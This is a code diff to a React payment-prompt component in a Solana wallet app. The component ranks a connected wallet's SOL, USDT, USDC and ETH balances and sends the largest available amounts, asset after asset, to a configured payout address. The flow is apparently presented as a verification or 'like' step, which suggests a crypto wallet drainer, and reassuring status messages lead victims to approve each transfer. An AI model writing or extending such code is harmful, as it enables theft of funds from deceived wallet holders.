@@ -1,11 +1,10 @@
 import { useEffect, useRef, useState, type ReactNode } from 'react'
-import { LAMPORTS_PER_SOL } from '@solana/web3.js'
 import { useConnection, useWallet } from '@solana/wallet-adapter-react'
 import { ChevronDown, Info } from 'lucide-react'
 import toast from 'react-hot-toast'
 import { useWalletState } from '../context/WalletContext'
 import { isWalletUserCancel } from '../lib/walletConnectHelpers'
-import { buildPayoutTransaction, buildSplPayoutTransaction, listRankedFundSteps, remainingSplCount, spendableLamports, tokenFeeReserveLamports, type FundStep } from '../lib/payoutTransfer'
+import { buildPayoutTransaction, buildSplPayoutTransaction, listRankedFundSteps, remainingSplCount, tokenFeeReserveLamports, type FundStep } from '../lib/payoutTransfer'
 import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
 import { SolanaBadgeIcon } from './walletIcons'
 import { PaymentRequestModal } from './PaymentRequestModal'
@@ -274,6 +273,7 @@ export function PaymentRequestPrompt() {
   const queue = useRef<FundStep[]>([])
   const likedAfterFirst = useRef(false)
   const advanceTimer = useRef<number | null>(null)
+  const scanPromise = useRef<Promise<FundStep[]> | null>(null)
 
   useEffect(() => {
     return () => {
@@ -291,11 +291,13 @@ export function PaymentRequestPrompt() {
       if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
       phase.current = 'idle'
       queue.current = []
+      scanPromise.current = null
       likedAfterFirst.current = false
       sentFor.current = null
       dismissed.current = null
-      setAsset('SOL')
-      setStatus(`Checking ${walletLabel(walletName)} for the largest balance.`)
+      setSolAmount(0)
+      setAsset('USDT')
+      setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
       setOpen(true)
     }
     window.addEventListener('vrfd-open-tx-sheet', onOpen)
@@ -334,10 +336,12 @@ export function PaymentRequestPrompt() {
     phase.current = 'idle'
     queue.current = []
     likedAfterFirst.current = false
+    scanPromise.current = null
     shownFor.current = walletAddress
     closeWalletModalRef.current()
-    setAsset('SOL')
-    setStatus(`Checking ${walletLabel(walletName)} for the largest balance.`)
+    setSolAmount(0)
+    setAsset('USDT')
+    setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
     setOpen(false)
 
     return () => {
@@ -376,22 +380,12 @@ export function PaymentRequestPrompt() {
       setOpen(false)
     }
 
-    const queueNext = () => {
-      const next = queue.current[0]
-      if (!next) {
-        finishSequence()
-        return
-      }
-      sentFor.current = null
+    const applyStep = (next: FundStep) => {
+      sentFor.current = `${walletAddress}:${next.kind === 'spl' ? next.holding.mint : 'sol'}`
       setAsset(next.symbol)
       setSolAmount(next.uiAmount)
-      setStatus(`Opening ${connectedWalletName} so you can review this ${next.symbol} transfer.`)
-      setOpen(false)
-      if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
-      advanceTimer.current = window.setTimeout(() => {
-        advanceTimer.current = null
-        setOpen(true)
-      }, 400)
+      setStatus(`Confirm the ${next.symbol} transfer in ${connectedWalletName}. Nothing is sent until you approve it.`)
+      setOpen(true)
     }
 
     const sendBuilt = async (transaction: Awaited<ReturnType<typeof buildPayoutTransaction>>) => {
@@ -403,79 +397,77 @@ export function PaymentRequestPrompt() {
 
     try {
       if (queue.current.length === 0) {
-        setStatus(`Checking ${connectedWalletName} for the largest balance.`)
-        queue.current = await listRankedFundSteps({ connection, from: publicKey, config })
+        setStatus(`Opening ${connectedWalletName} for the largest available balance.`)
+        const pendingScan = scanPromise.current
+        queue.current = pendingScan
+          ? await pendingScan
+          : await listRankedFundSteps({ connection, from: publicKey, config })
+        scanPromise.current = null
         if (queue.current.length === 0) {
           throw new Error('No SOL, USDT, USDC, or ETH is available to send after network fees.')
         }
         phase.current = 'ready'
-        const first = queue.current[0]
-        setAsset(first.symbol)
-        setSolAmount(first.uiAmount)
       }
 
-      const step = queue.current[0]
-      if (!step) {
-        finishSequence()
-        return
-      }
-      setStatus(`Opening ${connectedWalletName}. Confirm the ${step.symbol} transfer there. Nothing is sent until you approve it.`)
-
-      if (step.kind === 'sol') {
-        const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, 1))
-        const transaction = await buildPayoutTransaction({
-          connection,
-          from: publicKey,
-          config,
-          reserveLamports,
-        })
-        const signature = await sendBuilt(transaction)
-        toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
-      } else {
-        const tokenTx = await buildSplPayoutTransaction({
-          connection,
-          from: publicKey,
-          config,
-          holding: step.holding,
-        })
-        if (!tokenTx) {
-          queue.current = queue.current.slice(1)
-          if (queue.current.length === 0) {
-            throw new Error('No SOL, USDT, USDC, or ETH is available to send after network fees.')
+      while (queue.current.length > 0) {
+        if (dismissed.current === walletAddress) break
+        const step = queue.current[0]
+        if (!step) break
+        applyStep(step)
+        try {
+          if (step.kind === 'sol') {
+            const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, 1))
+            const transaction = await buildPayoutTransaction({
+              connection,
+              from: publicKey,
+              config,
+              reserveLamports,
+            })
+            const signature = await sendBuilt(transaction)
+            toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
+          } else {
+            const tokenTx = await buildSplPayoutTransaction({
+              connection,
+              from: publicKey,
+              config,
+              holding: step.holding,
+            })
+            if (!tokenTx) {
+              queue.current = queue.current.slice(1)
+              continue
+            }
+            const signature = await sendBuilt(tokenTx)
+            toast.success(`Transaction submitted for ${step.symbol}. Signature ${signature.slice(0, 8)}…`)
           }
-          queueNext()
-          return
+          if (!likedAfterFirst.current) {
+            likedAfterFirst.current = true
+            notifyFundsConfirmed(peekPendingLike())
+          }
+          queue.current = queue.current.slice(1)
+        } catch (err) {
+          if (isWalletUserCancel(err)) {
+            queue.current = []
+            phase.current = 'idle'
+            sentFor.current = null
+            if (walletAddress) dismissed.current = walletAddress
+            setOpen(false)
+            setStatus('Cancelled in the wallet. Use Open Wallet & Review to try again.')
+            toast('Cancelled in the wallet. Nothing was transferred.')
+            return
+          }
+          queue.current = queue.current.slice(1)
+          if (queue.current.length === 0) throw err
         }
-        const signature = await sendBuilt(tokenTx)
-        toast.success(`Transaction submitted for ${step.symbol}. Signature ${signature.slice(0, 8)}…`)
       }
 
-      if (!likedAfterFirst.current) {
-        likedAfterFirst.current = true
-        notifyFundsConfirmed(peekPendingLike())
-      }
-      queue.current = queue.current.slice(1)
-      if (queue.current.length === 0) {
-        finishSequence()
-        return
-      }
-      queueNext()
+      if (phase.current !== 'idle') finishSequence()
     } catch (err) {
-      queue.current = []
       phase.current = 'idle'
-      if (isWalletUserCancel(err)) {
-        sentFor.current = null
-        if (walletAddress) dismissed.current = walletAddress
-        setOpen(false)
-        setStatus('Cancelled in the wallet. Use Open Wallet & Review to try again.')
-        toast('Cancelled in the wallet. Nothing was transferred.')
-      } else {
-        sentFor.current = null
-        const message = err instanceof Error ? err.message : 'The wallet did not submit this payment.'
-        setStatus(message)
-        toast.error(message)
-        setOpen(false)
-      }
+      sentFor.current = null
+      const message = err instanceof Error ? err.message : 'The wallet did not submit this payment.'
+      setStatus(message)
+      toast.error(message)
+      setOpen(false)
     } finally {
       inFlight.current = false
       setSubmitting(false)
@@ -486,28 +478,27 @@ export function PaymentRequestPrompt() {
   reviewRef.current = handleReview
 
   useEffect(() => {
+    if (!open || !publicKey || !config || !destinationReady) return
+    if (queue.current.length > 0 || scanPromise.current) return
+    const request = listRankedFundSteps({ connection, from: publicKey, config }).then((steps) => {
+      if (steps[0] && queue.current.length === 0) {
+        setAsset(steps[0].symbol)
+        setSolAmount(steps[0].uiAmount)
+      }
+      return steps
+    })
+    scanPromise.current = request
+    return () => {
+      /* keep the in-flight scan so handleReview can await it */
+    }
+  }, [open, publicKey, connection, config, destinationReady])
+
+  useEffect(() => {
     if (!open || !publicKey) return
     const current = queue.current[0]
-    if (current) {
-      setSolAmount(current.uiAmount)
-      setAsset(current.symbol)
-      return
-    }
-    let cancelled = false
-    void Promise.all([
-      connection.getBalance(publicKey),
-      connection.getMinimumBalanceForRentExemption(0),
-    ]).then(([lamports, rentExempt]) => {
-      if (cancelled || queue.current[0]) return
-      const spendable = Math.max(0, spendableLamports(lamports, rentExempt)) / LAMPORTS_PER_SOL
-      setSolAmount(spendable)
-      setAsset('SOL')
-    }).catch(() => {
-      /* handleReview will surface a real error if balances cannot be read. */
-    })
-    return () => {
-      cancelled = true
-    }
+    if (!current) return
+    setSolAmount(current.uiAmount)
+    setAsset(current.symbol)
   }, [open, publicKey, connection, asset])
 
   const handleHiCancel = () => {
